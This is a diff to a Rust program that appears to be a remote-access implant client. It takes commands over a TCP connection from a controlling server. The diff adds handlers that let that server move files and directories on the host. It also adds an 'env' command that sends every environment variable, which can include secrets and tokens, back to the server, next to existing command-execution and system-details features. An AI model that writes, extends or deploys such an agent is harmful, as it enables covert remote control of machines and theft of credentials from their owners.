@@ -13,6 +13,29 @@ use std::time::Duration;
 use std::env;
 
 
+/* Recursive function to move a directory. */
+fn move_dir_recursive(src: &Path, dst: &Path) -> std::io::Result<()> {
+
+    // https://medium.com/@akaivdo/rust-operating-files-and-folders-7ae4fc3cdad6
+    if src.is_dir() {
+        fs::create_dir_all(dst)?;
+        for entry in src.read_dir()? {
+            let entry = entry?;
+            let src_path = entry.path();
+            let dst_path = dst.join(entry.file_name());
+            if src_path.is_dir() {
+                move_dir_recursive(&src_path, &dst_path)?;
+            } else {
+                fs::rename(&src_path, &dst_path)?;
+            }
+        }
+    } else {
+        fs::rename(src, dst)?;
+    }
+    fs::remove_dir_all(src)?;
+    Ok(())
+}
+
 /* Function to check if a file exists and return true or false. */
 fn file_exists(path: &str) -> bool {
 
@@ -20,6 +43,7 @@ fn file_exists(path: &str) -> bool {
     Path::new(path).exists()
 
 }
+
 fn executecommand(cmd: &String) -> String{
 
      // Declare variables for shell and argument.
@@ -379,6 +403,104 @@ fn main() {
 
                 }
 
+                "movefile" => {
+
+                 
+                    // Debug.
+                    println!("Moving file or directory from server.");
+
+                    // Check token length.
+                    if tokens.len() < 3 {
+            
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: No source {}provided for moving.\0").unwrap();
+                        continue;
+            
+                    }
+
+                    // Get the first token in the index and set to the source.
+                    let source = tokens[1];
+
+                    // Get the second token in the index and set to the destination.
+                    let destination = tokens[2];
+
+                    // Check if the source file or directory exists.
+                    if !Path::exists(Path::new(source)) {
+
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: Source file doesn't exist.\0").unwrap();
+                        continue;
+                    
+                    }
+                    // Move the file or directory from the source to the destination.
+                    fs::rename(source, destination).unwrap();
+
+                    // check if the file or directory exists.
+                    if !Path::exists(Path::new(source)) {
+
+                        // Send a successful message to the server.
+                        tcpstream_write.write_all(b"File or directory moved.\0").unwrap();
+
+                    } else {
+
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: File or directory move failed.\0").unwrap();
+
+
+                    }
+
+                }
+
+                "movedir" => {
+
+                    // Debug.
+                    println!("Moving directory from server.");
+
+                    // Check token length.
+                    if tokens.len() < 3 {
+            
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: No source directory provided for moving.\0").unwrap();
+                        continue;
+            
+                    }    
+                    // Get the first token in the index and set to the source.
+                    let source = tokens[1];
+
+                    // Get the second token in the index and set to the destination.
+                    let destination = tokens[2];
+
+                    // Check if the source directory exists.
+                    if !Path::exists(Path::new(source)) {
+
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: Source directory doesn't exist.\0").unwrap();
+                        continue;
+                        
+                    }
+
+                    // Move the directory from the source to the destination.
+                                    
+                    let src = Path::new(source);
+                    let dst = Path::new(destination);
+                    move_dir_recursive(src, dst).unwrap();
+                    
+                    // check if the directory exists.
+                    if Path::exists(Path::new(destination)) {
+
+                        // Send a successful message to the server.
+                        tcpstream_write.write_all(b"Directory moved.\0").unwrap();
+
+                    } else {
+
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: Directory move failed.\0").unwrap();
+
+
+                    }
+
+                }
+                
                 "dir" => {
 
                     // Debug.
@@ -515,6 +637,21 @@ fn main() {
                         }
                     
                     }
+
+                    "env" => {
+
+                        // Debug.
+                        println!("Sending environment variables to server.");
+
+                        // Set a string vector.
+                        let output = env::vars().collect::<Vec<(String, String)>>();
+
+
+                        // Send environment variables.
+                       tcpstream_write.write_all(format!("{:?}", output).as_bytes()).unwrap();
+                        tcpstream_write.write_all(b"\0").unwrap();
+                        
+                     }
                     
                     "sysdetails" => {
 
@@ -525,7 +662,7 @@ fn main() {
                         // CPUs and processes are filled!
                         // https://docs.rs/sysinfo/latest/sysinfo/
 
-                       // let mut output = Vec::new();
+                        // let mut output = Vec::new();
 
                         // First we update all information of our `System` struct.
                         sys.refresh_all();
